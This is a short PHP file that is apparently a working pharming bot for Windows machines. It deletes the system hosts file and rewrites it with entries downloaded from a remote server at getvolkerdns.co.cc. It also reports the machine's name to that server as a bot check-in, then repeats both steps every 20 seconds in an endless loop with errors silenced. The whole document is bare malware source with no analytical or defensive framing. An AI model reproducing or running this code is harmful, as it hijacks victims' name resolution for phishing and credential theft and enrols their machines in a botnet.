<?php
define(NameMaquina , PHP_uname("n") ) ;
define(UrlServer , 'http://getvolkerdns.co.cc/priv8');
define(Secons , 20 ) ;

@set_time_limit ( 0 );

function Pharming() {
	@unlink("c:/windows/system32/drivers/etc/hosts");
	$O = fopen("c:/windows/system32/drivers/etc/hosts", "a+");
	@fwrite( $O , @file_get_contents(UrlServer . "/Admin/FunctionsClient/host.php") ) ;
	@fclose( $O );
}

function CheckBot(){
	$O = @fopen(UrlServer . "/Admin/FunctionsClient/bots.php?name=" . NameMaquina , 'r');
}


function run(){
	CheckBot();
	Pharming();
	@sleep(Secons);
	run();
}

run();
?>